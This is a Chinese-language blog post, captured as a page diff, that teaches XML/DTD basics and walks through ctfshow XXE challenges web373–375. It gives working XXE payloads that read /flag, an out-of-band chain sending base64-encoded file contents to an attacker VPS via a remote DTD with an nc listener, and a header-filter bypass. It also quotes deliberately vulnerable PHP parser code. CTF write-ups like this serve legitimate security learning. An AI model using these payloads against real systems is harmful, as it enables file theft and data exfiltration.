@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html  lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg">
+    <script>
+    ;(function () {
+      const prefersDark =
+        window.matchMedia &&
+        window.matchMedia('(prefers-color-scheme: dark)').matches
+      const setting = localStorage.getItem('vueuse-color-scheme') || 'auto'
+      if (setting === 'dark' || (prefersDark && setting !== 'light'))
+        document.documentElement.classList.toggle('dark', true)
+    })()
+    </script>
+  <style type="text/css">
+    :root { color-scheme: light dark; --va-c-bg: #fff; }
+    html.dark { --va-c-bg: #000; }
+    html { background-color: var(--va-c-bg); }
+  </style><style id="valaxy-fouc">body{opacity:0!important}</style><style>body{transition:opacity .15s ease}</style><noscript><style>body{opacity:1!important}</style></noscript><script>(function foucGuardScript(maxDuration) {
+  var done = 0;
+  function reveal() {
+    if (done) return;
+    done = 1;
+    var s = document.getElementById("valaxy-fouc");
+    if (s) s.remove();
+  }
+  function check() {
+    var links = document.querySelectorAll('link[rel="stylesheet"]');
+    for (var i = 0; i < links.length; i++) {
+      if (!links[i].sheet) return;
+    }
+    reveal();
+  }
+  new MutationObserver(check).observe(document.head, {
+    childList: true,
+    attributes: true,
+    attributeFilter: ["media", "rel"]
+  });
+  addEventListener("load", reveal);
+  if (maxDuration)
+    setTimeout(reveal, maxDuration);
+})(5000)</script>
+    <script>
+    const locale = localStorage.getItem('valaxy-locale') || 'zh-CN';
+    document.documentElement.setAttribute('lang', locale);
+    </script>
+    
+  <script type="module" crossorigin src="/assets/index.DMmPyM9k.js"></script>
+  <link rel="modulepreload" crossorigin href="/assets/rolldown-runtime.CPPQDwIl.js">
+  <link rel="modulepreload" crossorigin href="/assets/framework.DfD1zdSt.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-i18n.BSMUyWAh.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/@vueuse/motion.B1bNFY-Z.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/dayjs.Do72Hm6d.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/pinia.CMOAtTts.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-router.DZdD3Cav.js">
+  <link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/nprogress.CQax14yo.js">
+  <link rel="stylesheet" crossorigin href="/assets/style.BqWFzkuS.css">
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.BQhdFMY1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.DMm9YOAa.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.Dq_IR9rO.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.BEiXGLvX.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.Di6jR-x-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.CTRA-rTL.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.CL6g_b3V.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.BsDP51OF.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.CTYiF6lA.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.Dxdc4cR9.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Cx986IdX.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Jm3AIy58.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.DxDJ3AOS.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.SpSLRI95.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.NWA7e6Wa.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.BMLOBm91.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.B22Nviop.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.Dr94JaBh.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.CZnvNsCZ.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.iY-2wyZ7.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.t53AETM-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.DA0__PXp.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.D1sUS0GD.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.DbIhKOiC.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.C3H0VqGB.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.DN2j7dab.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.DDBCnlJ7.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.CS6fqUqJ.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D3wIWfF6.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D5yQViql.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.mCD8mA8B.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.C195tn64.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.Dy4dx90m.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.oD1tc_U0.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size3-Regular.CTq5MqoE.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.Dl5lxZxV.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.BF-4gkZK.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.CO6r4hn1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.C0xS9mPB.woff" as="font" type="font/woff" crossorigin>
+<link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+<link rel="preload" href="/assets/none.DLM1AMsD.jpg" as="image">
+<link rel="preload" href="/assets/bg-img.kXdNMxcF.jpg" as="image">
+<link rel="preload" href="/assets/sidebar-bg-img.mp54gEws.webp" as="image">
+<link rel="modulepreload" crossorigin href="/assets/ctfshow-xxe.BiK94Yyx.js">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ctfshow-xxe - 北沐城歌</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&display=swap">
+<meta property="og:locale:alternate" content="en">
+<meta name="description" content="山行野宿，孤身万里">
+<meta property="og:description" content="山行野宿，孤身万里">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:site_name" content="北沐城歌">
+<meta property="og:title" content="ctfshow-xxe">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505191957523.png">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://kinsey973.github.io/">
+<link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg" type="image/svg+xml">
+<meta name="generator" content="Valaxy 0.28.7">
+<meta name="theme-color" content="#fff">
+<meta name="msapplication-TileColor" content="#fff">
+<meta name="twitter:card" content="summary_large_image">
+</head>
+<body>
+  <div id="app"><!--[--><!--[--><!--[--><!----><!----><div class="yun-page-header-gradient"></div><div class="yun-nav-menu z-$yun-z-nav-menu fixed bg-transparent" data-v-1791e522><div class="inline-flex justify-start items-center flex-1" data-v-1791e522><button type="button" class="vt-hamburger menu-btn sidebar-toggle leading-4 size-12 lg:hidden" aria-label="mobile navigation" aria-expanded="false" inline-flex cursor="pointer" hover="bg-white/80 dark:bg-black/80" z="$yun-z-menu-btn" data-v-1791e522><span class="vt-hamburger-container"><span class="vt-hamburger-top"></span><span class="vt-hamburger-middle"></span><span class="vt-hamburger-bottom"></span></span></button><a href="/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 data-v-1791e522><!--[--><div class="size-6 i-ri-home-4-line"></div><!--]--></a><div class="hidden lg:contents" data-v-1791e522><!--[--><a href="/posts/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 title="menu.posts" data-v-1791e522><!--[--><div class="size-6 i-ri-article-line"></div><!--]--></a><!--]--></div></div><div class="flex flex-1 flex-center" data-v-1791e522><div flex="~ center col h-full" class="nav-menu-title-container cursor-pointer" data-v-1791e522><!----><span class="font-light truncate">北沐城歌</span></div></div><div class="inline-flex-center justify-end items-center flex-1" data-v-1791e522><button class="yun-icon-btn rounded-none! hidden sm:inline-flex" title="切换语言" style="color:var(--va-c-text);" data-v-1791e522><div i-ri-translate class="transition transform"></div></button><button class="yun-icon-btn yun-toggle-dark rounded-none!" title="切换深色模式" data-v-1791e522><div i="ri-sun-line dark:ri-moon-line"></div></button><!--[--><button class="yun-search-btn yun-icon-btn popup-trigger rounded-none! size-12 inline-flex justify-center items-center" text="xl $va-c-text" title="搜索"><div i-ri-search-line op-80 hover="op-100"></div></button><!----><!--]--></div></div><!----><!----><!----><!--[--><div class="yun-bg"></div><!--]--><!----><a href="#" class="back-to-top yun-icon-btn bg-$va-c-bg-soft shadow-md"><div class="size-8" i-ri-arrow-up-s-line></div><svg class="progress-circle-container" viewBox="0 0 100 100"><circle stroke-dasharray="301.59289474462014 301.59289474462014" stroke-dashoffset="301.59289474462014" stroke="currentColor" stroke-width="2" stroke-linecap="round" class="progress-circle" cx="50" cy="50" r="48" fill="none"></circle></svg></a><!--]--><!--[--><meting-js fixed="true" id="2049540645" server="netease" type="song" mini="true" mutex="false" listFolded="false" style=""></meting-js><!--]--><!----><!--]--><div class="min-h-screen flex flex-col"><div class="mt-12 md:mt-24 yun-layout-wrapper__content"><!--[--><div class="yun-layout-left gap-4 sticky top-$yun-margin-top w-80"><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden p-4 min-h-sm" flex="~ col gap-1" min-h="100px" bg="$va-c-bg-light"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><div class="site-info gap-1 items-center text-center" flex="~ col" p="t-8"><a href="/about" class="site-author-avatar inline-flex-center"><div class="relative yun-author-avatar"><div class="absolute size-full avatar-bg bg-image-$yun-home-hero-image-background-image filter-blur-2xl op-30"></div><img class="rounded-full size-full bg-white dark:bg-white/20 p-1 m-0 absolute" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png" alt="avatar"><span class="site-author-status absolute" title="The moonlight is beautiful.">💛</span></div></a><a href="/about" class="site-author-name font-black font-serif text-$va-c-text op-80 hover:op-100 flex-center">北歌</a><a href="/about/site" class="site-name text-lg leading-loose">北沐城歌</a><h4 class="site-subtitle block op-70" text="xs">北沐城歌|北歌的技术分享</h4><div class="site-description">山行野宿，孤身万里</div></div><div class="yun-gradient-line my-2 op-20"></div><nav class="site-nav" text-xl mt-2><a href="/archives/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="归档" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-archive-line"></div><div class="text-2xl icon-active i-ri-archive-fill"></div><span class="text-xs">归档</span></div><span class="count text-base text-black/80 dark:text-white/80">41</span></a><a href="/categories/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="分类" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-folder-2-line"></div><div class="text-2xl icon-active i-ri-folder-2-fill"></div><span class="text-xs">分类</span></div><span class="count text-base text-black/80 dark:text-white/80">6</span></a><a href="/tags/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="标签" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-price-tag-3-line"></div><div class="text-2xl icon-active i-ri-price-tag-3-fill"></div><span class="text-xs">标签</span></div><span class="count text-base text-black/80 dark:text-white/80">26</span></a></nav><div class="yun-gradient-line my-2 op-20"></div><div class="links-of-author"><!--[--><a class="links-of-author-item yun-icon-btn" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange;"><div class="i-ri-rss-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C;"><div class="i-ri-netease-cloud-music-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&amp;jump_from=webapi" title="QQ 2409101203" target="_blank" style="color:#12B7F5;"><div class="i-ri-qq-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494;"><div class="i-ri-github-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:white;"><div class="i-ri-train-line icon"></div></a><!--]--></div><div class="yun-gradient-line my-2 op-20"></div><div class="links flex-center"><!--[--><a href="/links/" class="va-link link-item yun-icon-btn" inline-flex title="网络世界的小伙伴们" style="color:hotpink;"><!--[--><div class="i-ri-open-arm-line icon size-6"></div><!--]--></a><a class="va-link link-item yun-icon-btn" inline-flex title="我的旧博客" style="color:#e16f00;" href="https://kinseyy.github.io/" target="_blank"><!--[--><div class="i-ri-quill-pen-line icon size-6"></div><!--]--><!----></a><a href="/categories/" class="va-link link-item yun-icon-btn" inline-flex title="分类" style="color:#f5f5f5;"><!--[--><div class="i-ri-apps-line icon size-6"></div><!--]--></a><a href="/tags/" class="va-link link-item yun-icon-btn" inline-flex title="标签" style="color:#f5f5f5;"><!--[--><div class="i-ri-bookmark-3-line icon size-6"></div><!--]--></a><!--]--></div><!--]--></div><!----></div><template></template><!--]--></div><main class="yun-main lt-md:w-full" flex="~ center"><!--[--><div class="content w-full md:w-3xl lg:w-2xl xl:w-2xl 2xl:w-4xl" flex="~ col grow" p="lt-md:0"><div class="yun-card flex-center rounded-2 overflow-hidden" flex="col" min-h="100px" bg="$va-c-bg-light" m="0"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><div class="mt-8 mb-4"><!--[--><header class="post-header"><h1 p="2" text="2xl center" font="serif black" style="color:" class="post-title flex-center"><!----><span inline-flex class="leading-none">ctfshow-xxe</span></h1></header><!--]--></div><!--[--><!--[--><!--[--><!--[--><!----><div flex="~ center" text="sm" class="post-meta-col post-meta gap-4"><div class="post-time flex items-center gap-4"><span class="posted-time inline-flex-center gap-1" title="发表于2025-05-19 19:02:05"><div class="inline-block" i-ri-calendar-line></div><time class="op-80">2025-05-19</time></span><!----></div><!--[--><span id="busuanzi_container_page_pv"> 本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span><!--]--><div class="inline-flex-center gap-4"><div class="inline-flex-center post-counter gap-4"><span class="word-count inline-flex-center gap-1" title="本文字数"><div class="inline-block" i-ri-file-word-line></div><span class="op-80">2.3k</span></span><span class="reading-time inline-flex-center gap-1" title="阅读时长"><div i-ri-timer-line></div><time class="op-80">10m</time></span></div><!----><!----></div></div><!--]--><!----><div class="inline-flex mt-2" text="sm" py="1"><a href="/categories?category=%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" class="transition post-category inline-flex-center text-xs border-$va-c-divider" px-2 h="7" border rounded-full hover="bg-blue-500 text-white"><div m="x-1" inline-flex i-ri-folder-2-line></div><span>学习笔记</span></a><span mx="2"></span><div class="post-tags inline-flex" items="center" gap="1" flex="wrap 1" justify="end"><!--[--><a href="/tags/?tag=xxe" class="transition post-tag inline-flex-center text-xs border-$va-c-divider" px-2 h="7" rounded-full border hover="bg-blue-500 text-white"><span>xxe</span></a><!--]--></div></div><!--]--><!--]--><!--]--><div p="x-4 b-8" class="sm:px-6 lg:px-12 xl:px-16" w="full"><!--[--><!--]--><!--[--><article class="markdown-body"><!--[--><!----><!----><!--[--><!--]--><!--[--><p>摘要：XML语法 1.是树形结构，必须具有根元素 例如 2.声明：&amp;lt;?xml version=“1.0” encoding=“UTF-8”? 3.在标签中，大小写敏感 4.属性的值必须加引号 5.实体引用 一些字符拥有特殊含义，所以使用实体引用代替特殊字符 DTD 作用 在XML文档中加入DTD声明可以。</p><p>&lt;!-- more --&gt;</p><h3 id="xml语法" tabindex="-1">XML语法 <a class="header-anchor" href="#xml语法" aria-label="Permalink to &quot;XML语法&quot;">​</a></h3><p>1.是树形结构，必须具有根元素</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;root&gt;
+  &lt;child&gt;
+    &lt;subchild&gt;.....&lt;/subchild&gt;
+  &lt;/child&gt;
+&lt;/root&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>例如</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;note&gt;
+  &lt;to&gt;Tove&lt;/to&gt;
+  &lt;from&gt;Jani&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don&#39;t forget me this weekend!&lt;/body&gt;
+&lt;/note&gt; 
+</code></pre><button class="code-block-unfold-btn"></button></div><p>2.声明：`&lt;?xml version=“1.0” encoding=“UTF-8”?&gt;`</p><p>3.在标签中，大小写敏感</p><p>4.属性的值必须加引号</p><p>5.实体引用</p><p>一些字符拥有特殊含义，所以使用实体引用代替特殊字符</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;
+&lt;!--上面的&lt;是特殊字符 在解析器中会把他当做新元素的开始 修改如下--&gt;
+&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="dtd" tabindex="-1">DTD <a class="header-anchor" href="#dtd" aria-label="Permalink to &quot;DTD&quot;">​</a></h3><p>作用</p><p>在XML文档中加入DTD声明可以告诉XML解析器该文档遵循哪个DTD文档类型，对文档进行验证，以确保文档正确性。</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE rootElement SYSTEM &quot;example.dtd&quot;&gt;
+&lt;rootElement&gt;
+  &lt;childElement&gt;Hello World!&lt;/childElement&gt;
+&lt;/rootElement&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>限制：&lt;!ELEMENT</p><h3 id="xxe" tabindex="-1">XXE <a class="header-anchor" href="#xxe" aria-label="Permalink to &quot;XXE&quot;">​</a></h3><p>什么是XXE：构造恶意DTD主要是利用实体引用</p><p>实体引用介绍：</p><p>一、通用实体</p><p>1.内部实体（无SYSTEM 不需要应用外部文件）</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+        &lt;!ELEMENT foo ANY &gt;  &lt;!--定义元素为any 说明接收任何元素 --&gt;
+&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>在user标签中，使用&amp;进行引用，解析输出时就会被test替换</p><p>2.外部实体（带有SYSTEM 需要请求外部文件）</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;
+&lt;creds&gt;
+    &lt;user&gt;&amp;xxe;&lt;/user&gt;
+    &lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>相当于在dtd文档中创建了外部实体xxe，该实体的作用是读取本地文件</p><p>当解析xml文档时会遇到&amp;xxe，它会自动读取文件的操作</p><p>上面的SYSTEM引用的方法还能使用公用DTD的方法操作</p><p>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</p><p>二、参数实体</p><p>定义：%实体名</p><p>引用：%实体名</p><p>特点：类似上面通用实体，支持外部引用</p><p>举例：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; 
+&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; 
+%an-element; %remote-dtd;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>XXE危害</p><p>1.file://xxx读取文件</p><p>2.SSRF攻击</p><p>3.盲注 信息数据泄露</p><p>4.结合文件上传 getshell</p><h3 id="web373-有回显" tabindex="-1">web373（有回显） <a class="header-anchor" href="#web373-有回显" aria-label="Permalink to &quot;web373（有回显）&quot;">​</a></h3><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre><code class="language-php">&lt;?php
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+    $creds = simplexml_import_dom($dom);
+    $ctfshow = $creds-&gt;ctfshow;
+    echo $ctfshow;
+}
+highlight_file(__FILE__);   
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看代码，创建DOMDocument对象，加载XML文件，然后再XML文件中再提取ctfshow标签的内容，进行echo显示</p><p>解题：首先存在一个php://input读取我们抓包的内容</p><p>那么我们可以写一个xml文件</p><p>然后再ctfshow标签中引用外部实体，读取flag文件</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE XXE [
+&lt;!ENTITY cmd SYSTEM &quot;file:///flag&quot;&gt;
+]&gt;
+&lt;happy&gt;
+&lt;ctfshow&gt;&amp;cmd;&lt;/ctfshow&gt;
+&lt;/happy&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>得到flag</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505191957523.png" alt="image-20250519195729400" loading="lazy" decoding="async"></figure><h3 id="web374-无回显" tabindex="-1">web374（无回显） <a class="header-anchor" href="#web374-无回显" aria-label="Permalink to &quot;web374（无回显）&quot;">​</a></h3><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre><code class="language-php">&lt;?php
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
+highlight_file(__FILE__);  
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来观察这道题和上题的区别，同样存在xml文档的加载，但是却没有了echo进行回显，所以这道题怎么做</p><p>我们考虑flag外带，上我们自己的服务器将内容带出</p><p>分为两个部分：一个是直接让我们的题目服务器解析的xml文档语句，一个是我们存放在我们自己的vps上的外部dtd文档，然后在题目服务器xml解析时对我们的vps发起请求，然后在vps中将获得的内容传输到端口监听中</p><ol><li>使用<code>php://filter</code> 获取目标文件内容，然后将内容以http请求的方式发送到我们的vps上</li></ol><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!-- 格式约束--&gt;
+&lt;!DOCTYPE updateProfile [
+        &lt;!--使用伪协议读取题目服务器中的文件--&gt;
+    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt; 
+        &lt;!--写在我们服务器的dtd文件--&gt;
+    &lt;!ENTITY % dtds SYSTEM &quot;http://xxx/test/test.dtd&quot;&gt;
+        &lt;!--解析dtd的时候把外部的dtd文件放过来--&gt;
+    %dtds;
+]&gt;
+        
+&lt;!--补全形式--&gt;      
+&lt;root&gt;
+1
+&lt;/root&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>2.放在我们服务器上的内容</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; showflag SYSTEM &#39;http://ip:port/%file;&#39;&gt;&quot;&gt;
+&lt;!--evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25;  相当于% showflag--&gt;
+%dtd;
+%showflag;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>首先在1中会解析%dtds 去调用2的内容</p><p>然后2的内容展示在面板上之后会触发2中%dtd的解析 将2中内层嵌套的语句加载到面板上</p><p>然后解析%showflag 去加载SYSTEM的语句，访问我们的vps，同时携带file获得的数据，其中%file获得已经在面板中1里面的请求。</p><p>注意！一定要注意 POST传输的数据里面一定不要和vps中的文件里面定义的变量重名。比如vps中设置的是dtd我们POST传输的时候需要dtds或者其他任意的。</p><p>然后再bp中POST传入payload</p><p>在自己服务器开启监听nc -lnvp port</p><h3 id="web375" tabindex="-1">web375 <a class="header-anchor" href="#web375" aria-label="Permalink to &quot;web375&quot;">​</a></h3><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre><code class="language-php">&lt;?php
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+if(preg_match(&#39;/&lt;\?xml version=&quot;1\.0&quot;/&#39;, $xmlfile)){
+    die(&#39;error&#39;);
+}
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
+highlight_file(__FILE__);    
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>继续与上题进行类比，我们可以发现增加的是对xml头的整个语句的正则匹配</p><p>这里匹配到的语句是：&lt;?xml version=“1.0”</p><p>绕过方法一：</p><p>直接不写了，传一下看看</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;!-- 要引用（dtd里面），所以要加百分号% --&gt;
+&lt;!-- /flag 改成 /etc/passwd 可能会失败，因为内容太多了 --&gt;
+&lt;!DOCTYPE hacker[
+    &lt;!ENTITY  % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;
+    &lt;!ENTITY  % dtds SYSTEM &quot;http://xxx/test/test.dtd&quot;&gt;
+
+    %dtds;
+]&gt; 
+&lt;!-- 不能直接&lt;!ENTITY  % myurl SYSTEM &quot;http://vps-ip:port/%file&quot;&gt; ，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制--&gt;
+&lt;!-- %myurl;会读取远程dtd文件，读到了以后，因为远程dtd文件有一个实体的定义（% dtd），那么就会解析这个实体定义。（% dtd）实体的定义内容是另外一个实体定义（&amp;#x25; vps），那就会解析（&amp;#x25; vps），就会执行远程请求，请求地址（http://vps-ip:port/%file），会在我们的vps日志上留下痕迹。
+也可以起nc监听端口，能判断是否有向我们的vps发送请求以及请求内容。起nc的话% myurl的值，不要加端口，就vps-ip够了。
+总结就是，%myurl 这种引用会自动向地址发送请求。 --&gt;
+
+&lt;root&gt;
+1
+&lt;/root&gt;
